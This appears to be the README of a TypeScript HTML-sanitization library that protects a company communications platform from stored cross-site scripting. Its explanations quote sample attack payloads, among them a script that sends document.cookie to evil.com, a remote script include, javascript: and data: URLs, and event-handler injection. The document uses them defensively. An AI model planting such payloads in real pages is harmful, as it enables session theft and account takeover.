# HTML Sanitization

A TypeScript library that cleans untrusted HTML before it is stored or rendered — preventing Cross-Site Scripting (XSS) attacks in a multi-surface employee communications platform.

---

## Why this exists

Imagine a company's internal news feed. An employee writes an article using a rich-text editor. That HTML gets saved to a database and then rendered in the browsers of thousands of co-workers. If someone pastes `<script>document.location='https://evil.com/?c='+document.cookie</script>` into that editor and the platform renders it as-is, every employee who reads the article just had their session cookie stolen.

That is a **stored XSS attack**, and it is the primary threat this library defends against.

The rule is simple: we decide exactly which HTML tags and attributes are allowed, and we strip everything else — not escape it, not warn about it, **strip it**. The output is a safe HTML string you can hand directly to a `dangerouslySetInnerHTML` or equivalent without worry.

---

## Project structure

```
src/
├── types.ts          The three TypeScript types the whole library is built around
├── config.ts         Four context configs, each with its own allowlist
├── url-validator.ts  URL protocol validation (the isSafeUrl function)
├── sanitizer.ts      The one function you call: sanitize()
└── index.ts          Re-exports everything public
```

There are no classes, no singletons, no global state. Just functions and plain objects.

---

## The four contexts

Not all HTML surfaces are equal. A CMS article editor needs headings and tables. A push notification just needs plain text. This library uses a **context** to pick the right ruleset automatically.

| Context | Where it renders | What survives |
|---|---|---|
| `article` | Browser — rich CMS article | Headings, tables, images, links, lists, all formatting |
| `chat` | Browser — inline message | Bold, italic, links, code, lists |
| `email` | HTML email client | Tables + inline styles (required for email layout) |
| `notification` | Mobile OS notification tray | Plain text only — every tag is stripped |

Passing the wrong context is a security bug. A `notification` payload processed as `article` HTML could survive with embedded scripts. Always match the context to where the output will be rendered.

---

## Quick start

```typescript
import { sanitize } from './src';

// Clean an article from a rich-text editor
const result = sanitize(userHtml, 'article');
console.log(result.output);       // safe HTML
console.log(result.wasModified);  // true if anything was stripped
console.log(result.context);      // 'article'

// Clean a chat message
const msg = sanitize('<b>hello</b> <script>alert(1)</script>', 'chat');
// msg.output      => '<b>hello</b> '
// msg.wasModified => true

// Strip all markup for a push notification
const notif = sanitize('<b>You have a new message</b>', 'notification');
// notif.output => 'You have a new message'
```

The `wasModified` flag lets your application decide whether to log a security event. If an employee's input triggers it frequently, it might mean someone is probing the API directly, or a browser extension is injecting HTML.

---

## What gets blocked and why

### Script tags

`<script>alert(1)</script>` — obvious. But also `<script src="https://evil.com/steal.js"></script>`. Both the tag and everything inside it are completely discarded, not just the opening and closing tags. If you only stripped the tag element and kept the inner text, you would end up with `alert(1)` visible on the page — harmless in this case, but a sign of incomplete sanitization.

### Event handlers

Every `on*` attribute is an inline script. `onclick`, `onerror`, `onload`, `onmouseover`, `onfocus` — all of them. Even on tags that are otherwise allowed. `<img src="https://ok.com/image.png" onerror="steal()">` gets the `onerror` stripped while the `src` and `alt` survive.

### `javascript:` URLs

`<a href="javascript:alert(1)">click me</a>` — clicking this link executes JavaScript, not navigation. The URL validator catches this by using the platform's `URL` constructor rather than a regex, which correctly handles `JAVASCRIPT:`, `JavaScript:`, `  javascript:` (leading spaces), and any encoding variation a regex would miss.

### `data:` URIs

`<img src="data:image/svg+xml,...">` loads an SVG that can contain scripts. `<a href="data:text/html,<script>alert(1)</script>">` opens a page that runs a script on click. Both are blocked by the protocol allowlist. Only `http:`, `https:`, and `mailto:` are permitted.

### SVG and MathML

SVG has its own script execution model, its own event attributes, and namespace quirks that confuse HTML parsers. `<svg><script>alert(1)</script></svg>` is a real attack vector. Both `<svg>` and `<math>` are blocked in every context, no exceptions.

### Dangerous structural tags

- `<iframe>` — embeds an external page inside yours
- `<object>` / `<embed>` — legacy plugin execution (Flash, Java applets)
- `<form>` — submits data to an attacker-controlled server (CSRF / credential phishing)
- `<link>` — loads external CSS that can exfiltrate data via `url()` requests
- `<meta>` — can redirect the browser via `http-equiv="refresh"`
- `<base>` — changes the base URL for all relative links on the page

### CSS injection

The `style` attribute is not in the `article` or `chat` allowlists. `style="background:url(https://evil.com/pixel.gif)"` is a known technique for silently tracking whether a page was viewed. It is only allowed in the `email` context, where mail-client rendering genuinely requires inline styles for layout.

### Tab-napping

`<a href="https://legit.com" target="_blank">` — when a user clicks this, the new tab can set `window.opener.location` and silently redirect the original tab to a phishing page while the user is reading the new one. The sanitizer automatically adds `rel="noopener noreferrer"` to every link that has `target="_blank"`.

---

## How the URL validator works

Most URL sanitizers use a regex like `/^javascript:/i`. This is fragile. Browsers normalise whitespace before parsing URLs, so `  javascript:alert(1)` passes the regex check but still executes in a browser.

This library uses `new URL(input, 'https://placeholder.invalid')` instead. The platform URL parser performs the same normalisation the browser will perform later, so whatever comes out of `.protocol` is exactly what the browser would use.

```typescript
// All of these are correctly identified as dangerous:
isSafeUrl('javascript:alert(1)', ALLOWED)    // false
isSafeUrl('JAVASCRIPT:alert(1)', ALLOWED)    // false
isSafeUrl('JavaScript:alert(1)', ALLOWED)    // false
isSafeUrl('  javascript:alert(1)', ALLOWED)  // false — leading whitespace
isSafeUrl('vbscript:MsgBox(1)', ALLOWED)     // false
isSafeUrl('data:text/html,...', ALLOWED)     // false

// These pass through:
isSafeUrl('https://staffbase.com', ALLOWED)  // true
isSafeUrl('/articles/123', ALLOWED)          // true  — relative, no protocol
isSafeUrl('mailto:hr@company.com', ALLOWED)  // true
```

Relative URLs (strings with no `:`) pass through automatically and resolve against the page origin — they carry no protocol risk.

---

## Running the tests

```bash
npm install
npm test
```

The test suite has 64 tests across three files:

| File | What it tests |
|---|---|
| `sanitizer.test.ts` | All 11 attack categories, end-to-end through the full sanitize() function |
| `url-validator.test.ts` | Protocol detection, edge cases, safe vs. dangerous URLs |
| `config.test.ts` | Allowlist correctness per context |

```bash
npm run test:coverage   # line-by-line coverage report
npm run typecheck       # TypeScript type-check without building
npm run build           # compile to dist/
```

---

## How to add a new context

Say you need a `comment` context — less permissive than `chat`, no links allowed.

**Step 1.** Add `'comment'` to the union in `src/types.ts`:

```typescript
export type SanitizeContext = 'article' | 'chat' | 'notification' | 'email' | 'comment';
```

**Step 2.** Add a config in `src/config.ts`:

```typescript
const COMMENT_CONFIG: SanitizeConfig = {
  allowedTags: ['p', 'span', 'br', 'b', 'strong', 'i', 'em', 'u'],
  allowedAttributes: { '*': ['class'] },
  allowedProtocols: SAFE_PROTOCOLS,
  maxInputLength: 2_000,
};
```

**Step 3.** Register it in the `CONFIGS` map at the bottom of `config.ts`:

```typescript
const CONFIGS: Record<SanitizeContext, SanitizeConfig> = {
  article: ARTICLE_CONFIG,
  chat: CHAT_CONFIG,
  notification: NOTIFICATION_CONFIG,
  email: EMAIL_CONFIG,
  comment: COMMENT_CONFIG,
};
```

**Step 4.** Write tests in `src/__tests__/sanitizer.test.ts` that confirm what it allows and what it blocks.

TypeScript enforces exhaustiveness: if you add `'comment'` to the union but forget to add it to `CONFIGS`, the build fails at compile time with a type error, not at runtime.

---

## Maintaining this library

### Keeping dependencies up to date

The core dependency is `sanitize-html`. Subscribe to its GitHub releases. When a new version comes out:

1. Read the changelog before updating — `sanitize-html` has occasionally changed default behaviour in minor versions.
2. Run `npm install sanitize-html@latest`.
3. Run `npm test`. If all 64 tests pass, the update is safe.

Use Dependabot or Renovate to automate alerts. Also run `npm audit` in CI on every pull request.

### When a security researcher reports a bypass

1. **Reproduce it.** Find the minimal input that demonstrates the issue.
2. **Write a failing test first** — before touching any code. This documents the bypass permanently and prevents it from regressing silently in the future.
3. **Assess severity.** Stored or reflected? Requires user interaction? What is the blast radius?
4. **Fix it** — usually tightening the allowlist or upgrading `sanitize-html`.
5. **Confirm the test passes** and nothing else broke.
6. **Backport** if older versions are still deployed.
7. **Credit the researcher.**

### Before adding a new allowed tag

Answer these questions for every tag before adding it to any allowlist:

- Can any of its attributes execute code? (`src`, `href`, `action`, `formaction`, `srcdoc`)
- Does it contain a child execution surface? (script content, event handlers on children)
- Is it a namespace escape vector? (`svg`, `math`)
- Does it appear in the PortSwigger XSS cheat sheet?

If any answer is yes, either reject the request or handle the dangerous attributes explicitly in the config.

---

## Common interview questions

**What is the difference between escaping and sanitizing HTML?**

Escaping converts every special character to an HTML entity — `<` becomes `&lt;`, `>` becomes `&gt;`. The output is inert plain text; nothing renders as markup. Use escaping when a field is meant to be plain text (a username, a search query). Sanitizing parses the HTML and removes dangerous parts while keeping safe formatting intact. Use it when the field genuinely needs to support rich text.

**Why can't you sanitize HTML with a regex?**

HTML is not a regular language. Browsers apply complex parser rules — auto-closing tags, namespace switching, table fixup — that no regex can replicate. A string that looks harmless to a regex can produce a completely different DOM tree when a browser parses it. This is called mutation XSS, and it has been used to bypass production sanitizers. Always use a real HTML parser.

**What is mutation XSS?**

The sanitizer parses and serialises HTML that looks clean. But when the browser re-parses that serialised string in a specific context — inside a `<table>`, `<template>`, or `<select>` — it produces a different DOM tree, one that may contain executable nodes. It happens because the sanitizer's parser and the browser's parser disagree on how to handle malformed HTML. The fix is to use a sanitizer that serialises through a real DOM node rather than reconstructing HTML by string manipulation.

**Why sanitize on the server if you also sanitize on the client?**

Client-side sanitization can be bypassed with a direct HTTP request — an attacker does not go through your web UI. Server-side sanitization is the authoritative gate, running on code the attacker cannot modify. Client-side sanitization is defence-in-depth only.

**Should admins get a wider allowlist than regular users?**

Yes, admins may legitimately need richer formatting options. But "admin" does not mean "no sanitization". Admin accounts can be compromised. An attacker who gains admin access should not automatically gain the ability to inject scripts into the content feed of an entire organisation. Sanitize everything; just use a wider allowlist for admin content.

**What is tab-napping?**

A page opened with `target="_blank"` can access `window.opener` and redirect the original tab to a phishing page while the user is reading the new one. The fix is `rel="noopener noreferrer"`, which severs the link between the opener and the opened page. This library adds it automatically to every `target="_blank"` link.

---

## Architecture notes

**Why `sanitize-html` instead of DOMPurify?**

DOMPurify is the gold standard for browser-side sanitization and has strong mXSS protections. The Node.js wrapper `isomorphic-dompurify` pulls in `jsdom`, whose transitive dependencies ship as ES modules — causing `SyntaxError: Unexpected token 'export'` in Jest's CommonJS test runner without significant workarounds.

`sanitize-html` is pure CommonJS, uses `htmlparser2`, works without any wrapper in Node or browser, and integrates cleanly with ts-jest. For server-side sanitization where the output is stored in a database before any browser ever sees it, the mXSS risk difference is negligible.

**Why `disallowedTagsMode: 'discard'` and not `'completelyDiscard'`?**

`'completelyDiscard'` removes a tag and all of its descendants, including text nodes. That means `<b>Hello</b>` in the `notification` context would produce an empty string instead of `Hello`. We want to strip markup and preserve readable text. The content of genuinely dangerous tags (script, style) is killed separately via the `nonTextTags` option, which discards their inner text entirely.
